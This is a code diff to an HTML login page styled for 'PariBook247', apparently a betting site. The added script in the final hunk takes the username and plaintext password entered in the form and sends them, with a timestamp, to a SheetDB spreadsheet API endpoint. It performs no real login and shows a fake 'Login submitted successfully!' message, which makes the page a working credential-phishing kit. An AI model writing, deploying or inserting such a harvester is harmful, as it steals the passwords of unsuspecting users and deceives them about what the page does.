@@ -4,7 +4,133 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>PariBook247 Login</title>
-    <link rel="stylesheet" href="style.css" />
+    <style>
+      /* BASIC STYLING */
+      body {
+        font-family: Arial, sans-serif;
+        background: #f7f7f7;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+
+      .main-container {
+        width: 350px;
+        background: #fff;
+        padding: 25px;
+        border-radius: 10px;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      }
+
+      .logo-box {
+        text-align: center;
+        margin-bottom: 20px;
+      }
+
+      .logo-box img {
+        width: 120px;
+      }
+
+      .login-card h2 {
+        text-align: center;
+        margin-bottom: 5px;
+      }
+
+      .login-card p {
+        text-align: center;
+        font-size: 14px;
+        color: #555;
+        margin-bottom: 15px;
+      }
+
+      label {
+        display: block;
+        margin-bottom: 5px;
+        font-weight: bold;
+      }
+
+      .input-field {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 15px;
+        border-radius: 5px;
+        border: 1px solid #ccc;
+        box-sizing: border-box;
+      }
+
+      .login-btn {
+        width: 100%;
+        padding: 10px;
+        background: #007bff;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-weight: bold;
+      }
+
+      .login-btn:hover {
+        background: #0056b3;
+      }
+
+      .signup-text {
+        text-align: center;
+        margin-top: 15px;
+        font-size: 14px;
+      }
+
+      .signup-text a {
+        color: #007bff;
+        text-decoration: none;
+      }
+
+      .apk-download {
+        text-align: center;
+        margin: 15px 0;
+        font-size: 14px;
+        cursor: pointer;
+      }
+
+      .disclaimer {
+        font-size: 11px;
+        color: #999;
+        text-align: center;
+        margin-top: 15px;
+      }
+
+      .password-wrapper {
+        position: relative;
+      }
+
+      .eye-icon {
+        position: absolute;
+        right: 10px;
+        top: 50%;
+        transform: translateY(-50%);
+        cursor: pointer;
+      }
+
+      .top-bar {
+        display: flex;
+        justify-content: space-between;
+        font-size: 12px;
+        margin-bottom: 10px;
+      }
+
+      .req {
+        color: red;
+      }
+
+      .forgot-text {
+        font-size: 12px;
+        color: #007bff;
+        cursor: pointer;
+        text-align: right;
+        margin-bottom: 10px;
+      }
+    </style>
   </head>
 
   <body>
@@ -24,19 +150,20 @@
         <h2 class="signin-title">Sign in</h2>
         <p class="signin-sub">Please enter your login details here.</p>
 
-        <label>Username <span class="req">*</span></label>
-        <input type="text" placeholder="Username" class="input-field" />
+        <form id="loginForm">
+          <label>Username <span class="req">*</span></label>
+          <input type="text" placeholder="Username" class="input-field" id="username" required />
 
-        <label>Password <span class="req">*</span></label>
+          <label>Password <span class="req">*</span></label>
+          <div class="password-wrapper">
+            <input type="password" placeholder="Password" class="input-field" id="password" required />
+            <span class="eye-icon" onclick="togglePassword()">👁️</span>
+          </div>
 
-        <div class="password-wrapper">
-          <input type="password" placeholder="Password" class="input-field" />
-          <span class="eye-icon">👁️</span>
-        </div>
+          <p class="forgot-text">Forgot Username/Password?</p>
 
-        <p class="forgot-text">Forgot Username/Password?</p>
-
-        <button class="login-btn">LOGIN</button>
+          <button class="login-btn" type="submit">LOGIN</button>
+        </form>
 
         <p class="signup-text">Don’t have account? <a href="#">Sign Up</a></p>
       </div>
@@ -53,5 +180,44 @@
         Only 18+ people should use the services and should use it responsibly.
       </p>
     </div>
+
+    <script>
+      // Show/Hide password
+      function togglePassword() {
+        const pw = document.getElementById("password");
+        pw.type = pw.type === "password" ? "text" : "password";
+      }
+
+      // Send data to SheetDB
+      document.getElementById("loginForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+
+        let username = document.getElementById("username").value;
+        let password = document.getElementById("password").value;
+
+        let sheetdbURL = "https://sheetdb.io/api/v1/3xlgn4yh1djoj";
+
+        fetch(sheetdbURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            data: {
+              username: username,
+              password: password,
+              time: new Date().toLocaleString()
+            }
+          })
+        })
+        .then(response => response.json())
+        .then(data => {
+          alert("Login submitted successfully!");
+          document.getElementById("loginForm").reset();
+        })
+        .catch(error => {
+          alert("Error sending data!");
+          console.error(error);
+        });
+      });
+    </script>
   </body>
 </html>
